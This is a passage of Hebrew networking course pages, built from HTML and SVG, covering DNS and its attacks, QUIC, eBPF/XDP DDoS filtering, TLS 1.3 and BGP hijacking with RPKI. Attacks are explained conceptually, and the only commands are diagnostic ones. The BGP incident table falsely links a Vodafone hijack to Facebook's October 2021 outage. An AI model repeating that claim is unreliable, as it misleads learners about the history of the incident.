  <line x1="125" y1="55" x2="205" y2="55" stroke="#86efac" stroke-width="1"/>
  <text x="165" y="51" font-size="8" fill="#86efac">②→Root</text>
  <line x1="205" y1="62" x2="125" y2="70" stroke="#86efac" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="160" y="72" font-size="8" fill="#86efac">③ .com NS</text>
  <line x1="125" y1="70" x2="275" y2="70" stroke="#fcd34d" stroke-width="1"/>
  <text x="200" y="66" font-size="8" fill="#fcd34d">④→TLD</text>
  <line x1="275" y1="77" x2="125" y2="88" stroke="#fcd34d" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="195" y="88" font-size="8" fill="#fcd34d">⑤ google.com NS</text>
  <line x1="125" y1="88" x2="332" y2="88" stroke="#c4b5fd" stroke-width="1"/>
  <text x="228" y="84" font-size="8" fill="#c4b5fd">⑥→Auth</text>
  <line x1="332" y1="95" x2="125" y2="108" stroke="#c4b5fd" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="228" y="110" font-size="8" fill="#c4b5fd">⑦ 142.250.x.x</text>
  <line x1="125" y1="108" x2="40" y2="120" stroke="#7dd3fc" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="75" y="122" font-size="8" fill="#7dd3fc">⑧ IP: 142.250.x.x</text>
</svg>
</div>
<table class="content-table">
  <tr><th>שחקן</th><th>תפקיד</th><th>דוגמה</th></tr>
  <tr><td>Client</td><td>שולח שאילתה ל-resolver</td><td>דפדפן שלך</td></tr>
  <tr><td>Recursive Resolver</td><td>עושה את כל העבודה בשבילך</td><td>8.8.8.8 (Google), 1.1.1.1 (CF)</td></tr>
  <tr><td>Root Nameserver</td><td>יודע רק מי אחראי על TLD</td><td>13 clusters (a-m.root-servers.net)</td></tr>
  <tr><td>TLD Nameserver</td><td>יודע מי אחראי על domain</td><td>Verisign לכל .com</td></tr>
  <tr><td>Authoritative NS</td><td>יודע את ה-IP האמיתי</td><td>ns1.google.com</td></tr>
</table>
</div>`
      },
      {
        type: "explanation",
        title: "DNSSEC, DoH, DoT — אבטחה",
        content: `<div dir="rtl">
<h2>DNS: הפרוטוקול הכי פגיע ב-stack</h2>
<p>DNS מקורי: UDP port 53, ללא הצפנה, ללא אימות. כל מי שבדרך יכול לזייף תשובות.</p>
<h3>DNSSEC — חתימות קריפטוגרפיות</h3>
<p>כל record מלווה בחתימה דיגיטלית. ה-resolver מאמת את השרשרת מה-Root ועד ה-record.</p>
<div class="code-preview"><pre><code># בדיקת DNSSEC עם dig
dig +dnssec cloudflare.com

# רשומות DNSSEC:
# RRSIG — חתימה על record set
# DNSKEY — המפתח הציבורי
# DS — Delegation Signer (שרשרת אמון)
# NSEC/NSEC3 — הוכחת אי-קיום domain</code></pre></div>
<h3>DNS-over-HTTPS (DoH) ו-DNS-over-TLS (DoT)</h3>
<table class="content-table">
  <tr><th>פרוטוקול</th><th>פורט</th><th>הצפנה</th><th>פרטיות מ-ISP</th></tr>
  <tr><td>DNS רגיל</td><td>53/UDP</td><td>❌ ללא</td><td>❌ גלוי</td></tr>
  <tr><td>DoT</td><td>853/TCP</td><td>✅ TLS</td><td>✅ מוצפן</td></tr>
  <tr><td>DoH</td><td>443/HTTPS</td><td>✅ TLS</td><td>✅ מוצפן + נראה כHTTPS</td></tr>
  <tr><td>DoQ</td><td>853/UDP-QUIC</td><td>✅ QUIC</td><td>✅ מהיר יותר</td></tr>
</table>
<h3>Anycast — למה 8.8.8.8 מהיר מכל מקום בעולם</h3>
<p>Google מפרסמת את 8.8.8.8 מ-dozens of locations עם BGP Anycast. BGP always routes to the "closest" — כך שאתה בישראל מדבר עם datacenter בישראל/אירופה, לא בארה"ב.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: DNS Hijacking של ISP",
        content: `<div dir="rtl">
<h2>כשה-ISP שלך קורא את השאילתות שלך</h2>
<p>שנת 2018: חוקר אבטחה גילה שISP ישראלי מפנה שאילתות DNS לשגיאה (NXDOMAIN) לדף ה-search שלו — גניבת תעבורה מדומיינים שגויים.</p>
<p>זה לגיטימי? עמום. אבל זה הדגים: ה-ISP רואה הכל. כל domain שגלשת אליו — גלוי לחלוטין בDNS.</p>
<p>מתקפות DNS אמיתיות יותר:</p>
<ul>
<li><strong>DNS Cache Poisoning</strong> (Kaminsky 2008): בגלל UDP, אפשר לנחש את ה-transaction ID ולהזריק תשובה מזויפת ל-cache של ה-resolver</li>
<li><strong>DNS Hijacking</strong>: שינוי ה-DNS settings על ה-router (לרוב דרך default password) → כל הרשת מדברת עם resolvers זדוניים</li>
<li><strong>NXNS Attack</strong>: גרום ל-recursive resolver לשלוח מיליוני שאילתות ל-victim NS → DDoS</li>
</ul>
<p><strong>הפתרון שהפך מקובל:</strong> Cloudflare 1.1.1.1 עם DoH. הISP שלך רואה HTTPS ל-1.1.1.1, לא DNS queries. חברות מאמצות DNS filtering (Cisco Umbrella) בתוך ה-VPN שלהן.</p>
<p><strong>הלקח:</strong> DNS הוא ה-phonebook של האינטרנט. מי ששולט בו — שולט במה אתה מגיע אליו.</p>
</div>`
      }
    ]
  },
  {
    id: 304,
    title: "QUIC ו-HTTP/3",
    pages: [
      {
        type: "explanation",
        title: "בעיית HOL Blocking שHTTP/2 לא פתר",
        content: `<div dir="rtl">
<h2>למה HTTP/2 לא מספיק</h2>
<p>HTTP/2 הביא multiplexing — שליחת מספר streams בחיבור TCP אחד. אבל TCP לא יודע שיש כמה streams...</p>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">HOL Blocking — HTTP/2 vs HTTP/3</text>
  <text x="90" y="30" text-anchor="middle" font-size="10" fill="#f87171" font-weight="bold">HTTP/2 over TCP</text>
  <rect x="10" y="38" width="50" height="14" rx="3" fill="#1e3a5f"/>
  <text x="35" y="48" text-anchor="middle" font-size="8" fill="#7dd3fc">Stream 1</text>
  <rect x="65" y="38" width="50" height="14" rx="3" fill="#7f1d1d"/>
  <text x="90" y="48" text-anchor="middle" font-size="8" fill="#fca5a5">LOST ❌</text>
  <rect x="120" y="38" width="50" height="14" rx="3" fill="#374151"/>
  <text x="145" y="48" text-anchor="middle" font-size="8" fill="#9ca3af">Stream 3 ⏳</text>
  <text x="90" y="66" text-anchor="middle" font-size="9" fill="#f87171">חבילה אחת אבדה → כל הstreams מחכים!</text>
  <text x="270" y="30" text-anchor="middle" font-size="10" fill="#4ade80" font-weight="bold">HTTP/3 over QUIC</text>
  <rect x="190" y="38" width="50" height="14" rx="3" fill="#14532d"/>
  <text x="215" y="48" text-anchor="middle" font-size="8" fill="#86efac">Stream 1 ✅</text>
  <rect x="245" y="38" width="50" height="14" rx="3" fill="#7f1d1d"/>
  <text x="270" y="48" text-anchor="middle" font-size="8" fill="#fca5a5">LOST ❌</text>
  <rect x="300" y="38" width="50" height="14" rx="3" fill="#14532d"/>
  <text x="325" y="48" text-anchor="middle" font-size="8" fill="#86efac">Stream 3 ✅</text>
  <text x="270" y="66" text-anchor="middle" font-size="9" fill="#4ade80">Stream 2 אבד → רק Stream 2 מחכה!</text>
  <line x1="10" y1="80" x2="350" y2="80" stroke="#334155" stroke-width="1" stroke-dasharray="5,3"/>
  <text x="180" y="95" text-anchor="middle" font-size="10" fill="#94a3b8">QUIC = streams עצמאיים לחלוטין בתוך UDP</text>
  <text x="180" y="112" text-anchor="middle" font-size="9" fill="#64748b">אובדן חבילה ב-stream אחד לא חוסם שאר הstreams</text>
</svg>
</div>
<p>ב-HTTP/2, אם packet אחד אובד, TCP מחכה להחזרתו — וכל 10 ה-streams שבאותו TCP connection <em>קפואים</em>. זה Head-of-Line (HOL) blocking ברמת TCP.</p>
<p>QUIC בנה streams עצמאיים מעל UDP — אובדן packet ב-stream 2 חוסם רק את stream 2.</p>
</div>`
      },
      {
        type: "explanation",
        title: "0-RTT ו-Connection Migration",
        content: `<div dir="rtl">
<h2>QUIC: מה שמבדיל אותו מ-TCP+TLS</h2>
<h3>0-RTT Connection Resumption</h3>
<p>TCP + TLS 1.3 = 1 RTT לחיבור חדש. אבל עם session resumption, QUIC שולח נתונים ב-first packet:</p>
<div class="code-preview"><pre><code>TCP + TLS 1.3 (חיבור ראשוני):
  SYN →
  ← SYN-ACK          (1 RTT)
  TLS ClientHello →
  ← TLS ServerHello   (2 RTT)
  נתונים →            (3 RTT!)

QUIC 0-RTT (חיבור חוזר):
  ClientHello + נתונים →  (0 RTT!)
  ← Server response</code></pre></div>
<h3>Connection Migration</h3>
<p>TCP = זוהה על ידי (src IP, src port, dst IP, dst port). מעבר מWiFi לסלולרי → חיבור נשבר.</p>
<p>QUIC = זוהה על ידי <strong>Connection ID</strong> אקראי. מעבר מWiFi לסלולרי → QUIC ממשיך בצורה שקופה. ה-stream לא נקטע.</p>
<table class="content-table">
  <tr><th>תכונה</th><th>TCP+TLS</th><th>QUIC</th></tr>
  <tr><td>חיבור ראשוני</td><td>1-3 RTT</td><td>1 RTT</td></tr>
  <tr><td>חיבור חוזר</td><td>1 RTT</td><td>0 RTT</td></tr>
  <tr><td>HOL blocking</td><td>ברמת TCP</td><td>אין</td></tr>
  <tr><td>Network migration</td><td>שובר חיבור</td><td>שקוף</td></tr>
  <tr><td>מוצפן</td><td>TLS שכבה נפרדת</td><td>מובנה בפרוטוקול</td></tr>
</table>
<p><strong>HTTP/3</strong> הוא HTTP/2 semantics מעל QUIC במקום TCP. כבר נתמך ב-Chrome, Firefox, Safari, nginx, Cloudflare.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Google QUIC לפני שהעולם ידע",
        content: `<div dir="rtl">
<h2>איך Google בנתה QUIC בשקט ואז שינתה את האינטרנט</h2>
<p>2012: Google שמה לב שTCP הוא bottleneck אמיתי — בעיקר על mobile networks עם packet loss גבוה. הפתרון של IETF יקח שנים. Google החליטה לפתרת לבד.</p>
<p>הם בנו QUIC תחילה כexperimental protocol, והפעילו אותו כברירת מחדל ב-Chrome ← Google Servers. המשתמשים לא ידעו — פשוט YouTube וChrome הרגישו מהירים יותר.</p>
<p>2015: Google פרסמה ש-~50% מבקשות Chrome כבר הולכות על QUIC. הנתונים הראו: חיבורי QUIC מהירים ב-30% ב-tail latency (percentile 99) לעומת TCP.</p>
<p>2018: Google הגישה QUIC ל-IETF לסטנדרטיזציה. אבל IETF שינתה הרבה — IETF QUIC שונה מGoogle QUIC. 2021: RFC 9000 — QUIC סטנדרטי, HTTP/3 (RFC 9114).</p>
<p>2023: כ-30% מהwebsites הגדולים תומכים בHTTP/3. כל request ל-cloudflare.com, google.com, facebook.com — כבר QUIC.</p>
<p><strong>הלקח:</strong> לפעמים הדרך לשנות סטנדרט היא לא לשכנע ועדה — אלא לבנות, לפרוס, לאסוף נתונים, ואז לבוא עם facts. Google שינתה את הinternet layer בשקט.</p>
</div>`
      }
    ]
  },
  {
    id: 305,
    title: "eBPF ורשתות בר-תכנות",
    pages: [
      {
        type: "explanation",
        title: "eBPF — תכנות הגרעין מבחוץ",
        content: `<div dir="rtl">
<h2>eBPF: הטכנולוגיה שמשנה Linux networking</h2>
<p>eBPF (extended Berkeley Packet Filter) מאפשר להריץ programs קטנים <em>בתוך</em> ה-Linux kernel — בלי לשנות קוד kernel ובלי module. הגרעין מריץ bytecode שעבר verification.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 140" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">eBPF Architecture</text>
  <rect x="10" y="22" width="160" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
  <text x="90" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">User Space — eBPF Program (C)</text>
  <rect x="180" y="22" width="170" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
  <text x="265" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">clang/llvm → eBPF bytecode</text>
  <line x1="180" y1="37" x2="180" y2="70" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,2"/>
  <rect x="60" y="68" width="240" height="26" rx="6" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="180" y="85" text-anchor="middle" font-size="10" fill="#93c5fd">Kernel Verifier — בודק safety (no loops, no crashes)</text>
  <line x1="180" y1="94" x2="180" y2="108" stroke="#3b82f6" stroke-width="1.5"/>
  <rect x="10" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
  <text x="60" y="123" text-anchor="middle" font-size="9" fill="#86efac">XDP Hook (NIC)</text>
  <rect x="130" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
  <text x="180" y="123" text-anchor="middle" font-size="9" fill="#86efac">TC Hook (traffic ctrl)</text>
  <rect x="250" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
  <text x="300" y="123" text-anchor="middle" font-size="9" fill="#86efac">Socket filter</text>
</svg>
</div>
<p>eBPF programs מוכנסים ל-hooks בגרעין. הgverifier מבטיח שהם לא יגרמו crash, לא ירוצו לנצח, ולא ייגשו לזיכרון לא מורשה.</p>
<h3>Maps — תקשורת kernel ↔ user space</h3>
<div class="code-preview"><pre><code>// eBPF program (C)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);   // source IP
    __type(value, __u64); // packet count
} packet_count SEC(".maps");

SEC("xdp")
int count_packets(struct xdp_md *ctx) {
    struct iphdr *ip = /* parse IP header */;
    __u64 *count = bpf_map_lookup_elem(&packet_count, &ip->saddr);
    if (count) (*count)++;
    return XDP_PASS;
}</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "XDP ו-Cilium — use cases",
        content: `<div dir="rtl">
<h2>מה עושים עם eBPF בפועל</h2>
<h3>XDP — eXpress Data Path</h3>
<p>XDP פועל על ה-NIC driver — לפני שהpacket מגיע ל-kernel network stack. המהירות: עשרות מיליוני packets לשנייה עם CPU בודד.</p>
<table class="content-table">
  <tr><th>XDP Action</th><th>מה עושה</th></tr>
  <tr><td><code>XDP_DROP</code></td><td>זורק packet מיידית — DDoS mitigation בלי kernel overhead</td></tr>
  <tr><td><code>XDP_PASS</code></td><td>מעביר ל-kernel stack — עיבוד רגיל</td></tr>
  <tr><td><code>XDP_TX</code></td><td>שולח בחזרה מאותו interface — hairpin</td></tr>
  <tr><td><code>XDP_REDIRECT</code></td><td>מפנה ל-interface אחר — load balancing מהיר</td></tr>
</table>
<h3>Cilium — Kubernetes Networking עם eBPF</h3>
<p>Cilium מחליף iptables ב-Kubernetes לחלוטין. iptables = O(n) lookup, רשימות ענקיות. eBPF maps = O(1) hash lookup.</p>
<div class="code-preview"><pre><code># בדיקה שCilium תקין
cilium status
cilium endpoint list

# כלי observability שמגיע עם Cilium
hubble observe --namespace production
# רואה: src pod → dst pod, protocol, verdict (allow/drop)</code></pre></div>
<h3>כלים נוספים</h3>
<ul>
<li><strong>bpftrace</strong> — scripting language לeBPF, כמו DTrace</li>
<li><strong>libbpf</strong> — C library לפיתוח eBPF programs</li>
<li><strong>Falco</strong> — security detection עם eBPF (syscall monitoring)</li>
<li><strong>Pixie</strong> — application observability בלי code changes</li>
</ul>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Cloudflare עוצרת DDoS עם eBPF",
        content: `<div dir="rtl">
<h2>כשגל של 800Gbps הגיע — ובכל זאת נשארנו online</h2>
<p>ספטמבר 2022: Cloudflare דיווחה על DDoS attack של 2.5 ביליון packets לשנייה. בגישה הישנה (iptables), כל rule הוא scan ליניארי — 10,000 rules = 10,000 בדיקות לכל packet. בלתי אפשרי.</p>
<p>Cloudflare בנתה מערכת XDP-based: כל traffic מנותח ב-eBPF עוד על ה-NIC. Fingerprint של DDoS traffic (TTL, IP options, packet size distribution) → XDP_DROP מיידי — הpacket לא נוגע ב-kernel כלל.</p>
<p>הנתונים: תוך 20 שניות מזיהוי → 2.5B pps dropped לפני שנגעו ב-stack. תשתית Cloudflare המשיכה לשרת traffic לגיטימי ללא הפרעה.</p>
<div class="code-preview"><pre><code># pseudocode של Cloudflare XDP DDoS mitigation
SEC("xdp")
int mitigate_ddos(struct xdp_md *ctx) {
    // Parse IP header
    if (is_spoofed_source_ip(ip->saddr))
        return XDP_DROP;

    // Rate limiting per-IP using BPF map
    if (exceeds_rate_limit(ip->saddr))
        return XDP_DROP;

    // Known attack signature
    if (matches_ddos_fingerprint(ctx))
        return XDP_DROP;

    return XDP_PASS; // legitimate traffic
}</code></pre></div>
<p><strong>הלקח:</strong> הגבול בין network ו-programming נמחק. eBPF מאפשר לבנות custom networking logic שפועל מהר יותר מכל hardware appliance — ישירות על commodity servers. זו הסיבה שכל חברה גדולה (Google, Meta, Netflix, Cloudflare) משקיעה כבד ב-eBPF.</p>
</div>`
      }
    ]
  },
  {
    id: 306,
    title: "TLS 1.3 — מאפס ל-Handshake",
    pages: [
      {
        type: "explanation",
        title: "TLS 1.2 vs 1.3 — מה השתנה?",
        content: `<div dir="rtl">
<h2>למה TLS 1.3 שינה הכל</h2>
<p>TLS 1.2 יצא ב-2008 — עידן אחר. הוא תמך ב-RC4, MD5, SHA-1, ואלגוריתמים שמאז הוכחו כשבורים. TLS 1.3 (RFC 8446, 2018) ניקה הכל וייעל מהיסוד.</p>
<table class="content-table">
  <tr><th>תכונה</th><th>TLS 1.2</th><th>TLS 1.3</th></tr>
  <tr><td>Handshake RTT</td><td>2-RTT</td><td>1-RTT (0-RTT אפשרי)</td></tr>
  <tr><td>Cipher suites</td><td>37 אפשרויות</td><td>5 בלבד (כולן חזקות)</td></tr>
  <tr><td>Forward Secrecy</td><td>אופציונלי</td><td>חובה תמיד</td></tr>
  <tr><td>RSA key exchange</td><td>נתמך</td><td>הוסר לחלוטין</td></tr>
  <tr><td>SHA-1 / MD5</td><td>נתמכים</td><td>הוסרו לחלוטין</td></tr>
  <tr><td>RC4</td><td>נתמך</td><td>הוסר לחלוטין</td></tr>
</table>
<p><strong>מדוע RC4/SHA-1/MD5 הוסרו?</strong> RC4: cryptographic biases מ-2013 מאפשרות לפענח 50% מה-traffic אחרי 2^26 connections. MD5 ו-SHA-1: collision attacks הוכחו (SHA-1 נשבר בפועל ב-2017 על ידי Google SHAttered project). TLS 1.3 מאפשר AES-GCM, ChaCha20-Poly1305 בלבד.</p>
</div>`
      },
      {
        type: "diagram",
        title: "1-RTT Handshake — TLS 1.3",
        content: `<div dir="rtl">
<h2>TLS 1.2 (2-RTT) vs TLS 1.3 (1-RTT)</h2>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <text x="60" y="14" text-anchor="middle" font-size="10" fill="#93c5fd">TLS 1.2 — 2 RTT</text>
  <text x="240" y="14" text-anchor="middle" font-size="10" fill="#86efac">TLS 1.3 — 1 RTT</text>
  <line x1="20" y1="20" x2="20" y2="128" stroke="#475569" stroke-width="1"/>
  <line x1="100" y1="20" x2="100" y2="128" stroke="#475569" stroke-width="1"/>
  <text x="20" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">C</text>
  <text x="100" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">S</text>
  <line x1="20" y1="35" x2="100" y2="45" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="34" text-anchor="middle" font-size="8" fill="#93c5fd">ClientHello</text>
  <line x1="100" y1="55" x2="20" y2="65" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="54" text-anchor="middle" font-size="8" fill="#86efac">ServerHello+Cert</text>
  <line x1="20" y1="75" x2="100" y2="85" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="74" text-anchor="middle" font-size="8" fill="#93c5fd">KeyExchange</text>
  <line x1="100" y1="95" x2="20" y2="105" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="60" y="94" text-anchor="middle" font-size="8" fill="#86efac">Finished</text>
  <line x1="200" y1="20" x2="200" y2="128" stroke="#475569" stroke-width="1"/>
  <line x1="280" y1="20" x2="280" y2="128" stroke="#475569" stroke-width="1"/>
  <text x="200" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">C</text>
  <text x="280" y="18" text-anchor="middle" font-size="8" fill="#94a3b8">S</text>
  <line x1="200" y1="40" x2="280" y2="55" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="240" y="38" text-anchor="middle" font-size="8" fill="#93c5fd">ClientHello+KeyShare</text>
  <line x1="280" y1="65" x2="200" y2="80" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="240" y="63" text-anchor="middle" font-size="8" fill="#86efac">ServerHello+Finished</text>
  <line x1="200" y1="90" x2="280" y2="100" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arr-tls)"/>
  <text x="240" y="88" text-anchor="middle" font-size="8" fill="#fcd34d">Application Data</text>
  <defs><marker id="arr-tls" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<p>ב-TLS 1.2, הclient צריך לחכות לServerHello לפני שיכול לשלוח את ה-KeyExchange — זה 2 round trips לפני שdata זורמת. ב-TLS 1.3, הclient שולח את ה-KeyShare כבר ב-ClientHello הראשון — רק RTT אחד!</p>
</div>`
      },
      {
        type: "explanation",
        title: "Forward Secrecy ו-0-RTT Resumption",
        content: `<div dir="rtl">
<h2>ECDHE ו-Perfect Forward Secrecy</h2>
<p><strong>Forward Secrecy (PFS)</strong> אומר: אפילו אם התוקף מצליח לגנוב את ה-private key של השרת — הוא לא יכול לפענח שיחות עבר שהוקלטו.</p>
<p>ב-TLS 1.2 עם RSA key exchange: הclient מצפין session key בpublic key של השרת. אם השרת נפרץ — כל השיחות ההיסטוריות ניתנות לפיענוח.</p>
<p>ב-TLS 1.3, רק ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) מותר. "Ephemeral" = המפתחות נוצרים מחדש לכל session ונמחקים אחרי. אין מפתח ישן שיכול לסייע לפיענוח.</p>
<pre><code># בדיקת TLS של שרת
openssl s_client -connect example.com:443 -tls1_3

# מה לחפש בoutput:
# Protocol  : TLSv1.3
# Cipher    : TLS_AES_256_GCM_SHA384
# Server Temp Key: X25519, 253 bits  (ECDHE!)

# בדיקת certificate
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|Not After:|TLS"</code></pre>
<p><strong>0-RTT (Early Data):</strong> ב-TLS 1.3 session resumption, הclient יכול לשלוח application data בround trip הראשון. מהיר מאוד — אבל attention: 0-RTT לא מגן מpreplay attacks. מתאים רק לGET requests, לא לPOST עם side effects.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Cipher Suites ב-TLS 1.3",
        content: `<div dir="rtl">
<h2>5 Cipher Suites שנשארו</h2>
<p>TLS 1.2 תמך ב-37 cipher suites — רבים מהם שבורים או חלשים. TLS 1.3 מאפשר רק 5, כולם עם AEAD (Authenticated Encryption with Associated Data):</p>
<ul>
  <li><strong>TLS_AES_128_GCM_SHA256</strong> — הנפוץ ביותר, מהיר בhardware עם AES-NI</li>
  <li><strong>TLS_AES_256_GCM_SHA384</strong> — אבטחה גבוהה, מומלץ לclassified data</li>
  <li><strong>TLS_CHACHA20_POLY1305_SHA256</strong> — מהיר במכשירים ללא AES hardware (mobile)</li>
  <li><strong>TLS_AES_128_CCM_SHA256</strong> — IoT devices</li>
  <li><strong>TLS_AES_128_CCM_8_SHA256</strong> — IoT עם bandwidth מוגבל</li>
</ul>
<p><strong>AEAD</strong> = הצפנה + authentication באופרציה אחת. ב-TLS 1.2 עם CBC+HMAC, authentication היה שלב נפרד — גרם לvulnerabilities כמו BEAST ו-POODLE. עם GCM: אם מישהו שינה את ה-ciphertext, הdecryption נכשל מיידית.</p>
<p><strong>ההשפעה בפועל:</strong> HTTPS עם TLS 1.3 לוקח 50-100ms פחות ל-first byte על connections חדשים בהשוואה לTLS 1.2. על מובייל, בlatency גבוה, ההבדל מורגש.</p>
</div>`
      }
    ]
  },
  {
    id: 307,
    title: "Anycast ו-BGP Routing Security",
    pages: [
      {
        type: "explanation",
        title: "Anycast — כשאותה IP מגיעה ממקומות רבים",
        content: `<div dir="rtl">
<h2>Anycast: כיצד Cloudflare מגיש 1.1.1.1 מ-300 מקומות</h2>
<p>כשאתם שולחים query ל-1.1.1.1 (Cloudflare DNS), הבקשה מגיעה לPOP (Point of Presence) הקרוב אליכם — בתל אביב, לונדון, או ניו יורק — כולם עם אותה כתובת IP. זה <strong>Anycast</strong>.</p>
<p>כיצד? Cloudflare מפרסמת את הprefix 1.1.1.1/32 ב-BGP מ-300 מיקומים שונים. BGP routers בוחרים תמיד את ה-shortest AS path — כלומר הPOP הקרוב ביותר. Traffic אוטומטית מנותב לשרת הקרוב.</p>
<table class="content-table">
  <tr><th>Anycast יתרונות</th><th>פרטים</th></tr>
  <tr><td>Latency</td><td>תמיד הPOP הקרוב — הפחתת 50-200ms</td></tr>
  <tr><td>DDoS mitigation</td><td>Attack מחולק בין כל ה-POPs בעולם</td></tr>
  <tr><td>Failover</td><td>POP שנפל — BGP מסיר את הprefix אוטומטית</td></tr>
  <tr><td>Scalability</td><td>הוסף POP חדש = הוסף BGP peer</td></tr>
</table>
<p><strong>שימושים נפוצים:</strong> DNS (כל root nameservers הם Anycast), CDN, DDoS protection. <strong>לא מתאים ל:</strong> TCP sessions ארוכים (connection עלול לעבור לPOP אחר בין packets).</p>
</div>`
      },
      {
        type: "explanation",
        title: "BGP Hijacking ו-RPKI",
        content: `<div dir="rtl">
<h2>Pakistan Telecom 2008 — כשהאינטרנט נשבר לשעה</h2>
<p>פברואר 2008: Pakistan Telecom קיבלה הוראה מממשלה לחסום YouTube. הם הוסיפו route ל-BGP שאמר "אני מגיש את 208.65.153.0/24 (YouTube)". הבעיה: הroute הזה הופץ לכל האינטרנט. במשך שעה, traffic של YouTube מרחבי העולם הגיע ל-Pakistan Telecom — ונעלם.</p>
<p>הסיבה: BGP מסורתי הוא <strong>trust-based</strong>. כל AS יכול להכריז על כל prefix. אין authentication. מספיק שrenter אחד "טעה" — והEX-PREFIX מגיע לכולם.</p>
<p><strong>RPKI (Resource Public Key Infrastructure)</strong> היא הפתרון: מאגר cryptographically signed של "מי מורשה להכריז על איזה prefix".</p>
<pre><code># ROA — Route Origin Authorization
# "AS 13335 (Cloudflare) מורשה להכריז על 1.1.1.0/24"
{
  "asn": "AS13335",
  "prefix": "1.1.1.0/24",
  "maxLength": 24,
  "ta": "RIPE NCC"
}

# בדיקת ROA
curl https://stat.ripe.net/data/rpki-validation/data.json?resource=1.1.1.0/24

# bgpq4 — filter routes based on RPKI
bgpq4 -4 -A -J AS13335</code></pre>
</div>`
      },
      {
        type: "diagram",
        title: "BGP Hijack Incidents — טבלה היסטורית",
        content: `<div dir="rtl">
<h2>אירועי BGP Hijacking מפורסמים</h2>
<table class="content-table">
  <tr><th>שנה</th><th>מי</th><th>מה קרה</th><th>השפעה</th></tr>
  <tr><td>2008</td><td>Pakistan Telecom</td><td>Hijack YouTube prefix</td><td>YouTube down ~1 שעה עולמית</td></tr>
  <tr><td>2010</td><td>China Telecom</td><td>18 min hijack של 15% מroutes</td><td>Traffic US gov/mil עבר דרך China</td></tr>
  <tr><td>2018</td><td>eNet (AS10297)</td><td>Hijack Amazon Route53</td><td>MyEtherWallet phishing — $160K נגנב</td></tr>
  <tr><td>2019</td><td>Swiss datacenter</td><td>Leak של Google routes</td><td>Gmail/YouTube פגוע בEurope</td></tr>
  <tr><td>2021</td><td>Vodafone AS55410</td><td>Hijack Facebook prefixes</td><td>תרם לdown של Facebook אוקטובר 2021</td></tr>
</table>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">RPKI Validation Flow</text>
  <rect x="10" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="50" y="40" text-anchor="middle" font-size="9" fill="#93c5fd">RIR (RIPE/ARIN)</text>
  <text x="50" y="53" text-anchor="middle" font-size="8" fill="#64748b">signs ROAs</text>
  <rect x="140" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="180" y="40" text-anchor="middle" font-size="9" fill="#fcd34d">Router</text>
  <text x="180" y="53" text-anchor="middle" font-size="8" fill="#64748b">validates ROA</text>
  <rect x="270" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="310" y="40" text-anchor="middle" font-size="9" fill="#86efac">Valid route</text>
  <text x="310" y="53" text-anchor="middle" font-size="8" fill="#64748b">accepted</text>
  <rect x="270" y="80" width="80" height="35" rx="5" fill="#1e293b" stroke="#ef4444" stroke-width="1.5"/>
  <text x="310" y="95" text-anchor="middle" font-size="9" fill="#fca5a5">Invalid route</text>
  <text x="310" y="108" text-anchor="middle" font-size="8" fill="#64748b">dropped</text>
  <line x1="90" y1="42" x2="140" y2="42" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-rpki)"/>
  <line x1="220" y1="36" x2="270" y2="36" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-rpki)"/>
  <line x1="220" y1="52" x2="270" y2="88" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arr-rpki)"/>
  <defs><marker id="arr-rpki" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
